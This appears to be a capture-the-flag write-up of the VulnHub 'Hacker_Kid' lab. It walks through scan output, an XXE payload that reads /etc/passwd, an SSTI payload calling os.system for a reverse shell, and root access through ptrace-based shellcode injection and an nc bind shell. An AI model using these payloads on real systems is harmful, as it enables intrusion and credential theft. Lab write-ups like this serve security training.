[*] Hacker_Kid [*]

# paltfrom : vulnhub
# Date : 06/01/2022

# ->Enumeraton Phase:

# Nmap 7.91 scan initiated Thu Jan  6 13:27:49 2022 as: nmap -A -vv -p- -oN nmap 192.168.0.102
Nmap scan report for 192.168.0.102
Host is up, received arp-response (0.00030s latency).
Scanned at 2022-01-06 13:27:50 IST for 18s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT     STATE SERVICE REASON         VERSION
53/tcp   open  domain  syn-ack ttl 64 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Notorious Kid : A Hacker 
9999/tcp open  http    syn-ack ttl 64 Tornado httpd 6.1
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: TornadoServer/6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
MAC Address: 08:00:27:4E:6D:48 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/6%OT=53%CT=1%CU=31302%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=61D6A110%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 23.239 days (since Tue Dec 14 07:44:02 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.30 ms 192.168.0.102

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  6 13:28:08 2022 -- 1 IP address (1 host up) scanned in 19.09 seconds

# nmap udp port results

PORT     STATE    SERVICE  REASON     VERSION      
53/udp   open          domain   udp-response ttl 64 ISC BIND 9.16.1 (Ubuntu Linux)                                                                            
| dns-nsid:                                                                 
|_  bind.version: 9.16.1-Ubuntu                                     
|_dns-recursion: Recursion appears to be enabled   

631/udp  open|filtered ipp      no-response                            
5353/udp open|filtered zeroconf no-response  

 
# Found a domain : hackers.blackhat.local
>> add this domain in /etc/hosts file.when i use blackhat.local as domain name it gives the forbidden on web page.

>> when rquesting to url : http://192.168.0.102?page_no=21 website rendar a important information.

Okay so you want me to speak something ?
I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!
Out of my many homes...one such home..one such home for me : hackers.blackhat.local

>> there is login page after visiting the subdomain on port 9999 but no default cridentials are worked.
>> http://hackers.blackhat.local/form.html on this url i found a sample form page.
>> http://hackers.blackhat.local/app.html on this url there is a Sample application page.

# gobuster tool find some directories:

/images               (Status: 301) [Size: 315] [--> http://192.168.0.105/images/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.105/css/]   
/javascript           (Status: 301) [Size: 319] [--> http://192.168.0.105/javascript/]
/server-status        (Status: 403) [Size: 278] 

# dirsearch tool results:

Target: http://blackhat.local/                                                             
[13:45:42] Starting:                                                                 
[13:45:45] 403 -  279B  - /.ht_wsr.txt                                      
[13:45:45] 403 -  279B  - /.htaccess.orig                                                     
[13:45:45] 403 -  279B  - /.htaccess.save                                                   
[13:45:45] 403 -  279B  - /.htaccess.sample                                               
[13:45:45] 403 -  279B  - /.htaccess.bak1                                                      
[13:45:45] 403 -  279B  - /.htaccess_orig                                           
[13:45:45] 403 -  279B  - /.htaccess_sc                                   
[13:45:45] 403 -  279B  - /.htaccessBAK                                        
[13:45:45] 403 -  279B  - /.htaccessOLD                                    
[13:45:45] 403 -  279B  - /.htaccessOLD2                                  
[13:45:45] 403 -  279B  - /.htaccess_extra                                   
[13:45:45] 403 -  279B  - /.htm                              
[13:45:45] 403 -  279B  - /.htpasswd_test                                 
[13:45:45] 403 -  279B  - /.htpasswds
[13:45:45] 403 -  279B  - /.html        
[13:45:45] 403 -  279B  - /.httr-oauth  
[13:45:48] 403 -  279B  - /.php         
[13:46:19] 403 -  279B  - /cgi-bin/     
[13:46:37] 301 -  321B  - /javascript  ->  http://blackhat.local/javascript/
[13:47:03] 403 -  279B  - /server-status
[13:47:03] 403 -  279B  - /server-status/
[13:47:11] 200 -  141B  - /templates/   
[13:47:11] 301 -  320B  - /templates  ->  http://blackhat.local/templates/
[13:47:11] 200 -  141B  - /templates/index.html
[13:56:35] 200 -  332B  - /templates/login.html

# using dig command i found another subdomain :

; <<>> DiG 9.16.11-Debian <<>> hackers.blackhat.local @192.168.0.105
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 56879
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 29032804005b38a50100000061d806df83cce65054899991 (good)
;; QUESTION SECTION:
;hackers.blackhat.local.                IN      A

;; AUTHORITY SECTION:
blackhat.local.         3600    IN      SOA     blackhat.local. {hackerkid.blackhat.local}. 1 10800 3600 604800 3600

;; Query time: 0 msec
;; SERVER: 192.168.0.105#53(192.168.0.105)
;; WHEN: Fri Jan 07 14:54:44 IST 2022
;; MSG SIZE  rcvd: 125

>> when i go to that subdomain i rendar on register page .then i see this request on burpsuite .
>> all data from this register form is going to server in xml form .
>> so we have the XXE attack.

# proxy the request on burpsuite.
>> i see the data in xml format so i try following payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE local [<!ENTITY root SYSTEM "FILE:///etc/passwd">]>
<root><name>test</name>
<tel>1456234455</tel>
<email>&root;</email>
<password>test</password>
</root>

>> the i fetch the .bashrc file using php filters and i found username and passwords in that file:

username="admin"
password="Saket!#$%@!!"

>> but i do not login using these cridentials . so change the username as saket and it works.
>> then i found using name parameter this website is vulnerable to server side templet injection(ssti)
>> payload : {% import os %}{{ os.system('reverse shell') }}
>> at last got reverse shell of saket user.

# ->Privilage Escalation Phase:

>> i check all the suid binaries but not found any binary that me privilages as a root.
>> then check capabilities .and found a python2.7 having capability set as a cap_sys_ptrace+ep.
>> we can use this capability for gaining root access by injecting a shell code into a process
>> running as a root.
>> by searching on google i find a shellcode injecting code .save this python code in a file name 
>> as inject.py

>> on victim machine .find a process running a root. in this victim box apache2 runnign as root.

# python2.7 inject.py <process id>
>> then check the port 5600 is open. and then finaly connect that port .
# nc <ip> 5600

>> got root access.
 
 
 

